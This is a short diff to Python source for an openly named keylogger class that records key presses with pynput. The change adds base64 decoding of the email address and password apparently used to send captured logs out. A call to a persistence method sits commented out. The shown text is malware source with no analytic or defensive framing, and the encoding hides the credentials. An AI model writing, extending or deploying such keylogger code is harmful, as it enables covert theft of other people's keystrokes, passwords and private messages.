@@ -5,15 +5,19 @@ import subprocess
 import sys
 import pynput.keyboard
 import threading
+import base64
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
         #self.becomePersistent()
         self.log = ''
         self.interval = time_interval
-        self.email = email
-        self.password = password
+        self.email = self.decode(email)
+        self.password = self.decode(password)
 
+    def decode(self, string):
+        return base64.b64decode(string.encode()).decode()
+    
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
